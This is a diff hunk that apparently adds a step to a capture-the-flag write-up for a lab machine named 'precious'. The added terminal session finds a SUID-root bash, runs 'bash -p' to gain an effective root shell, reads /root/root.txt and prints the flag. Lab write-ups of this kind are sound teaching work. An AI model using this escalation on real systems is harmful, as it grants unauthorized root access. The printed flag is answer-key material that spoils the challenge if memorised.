@@ -754,6 +754,17 @@ User henry may run the following commands on precious:
 
 
 
+```
+henry@precious:/tmp$ ls -la /usr/bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /usr/bin/bash
+henry@precious:/tmp$ bash -p
+bash-5.1# id
+uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)
+bash-5.1# cat /root/root.txt
+108a1380138e91d8fb95a81a6741ca68
+
+```
+
 
 
 ## Conclusion
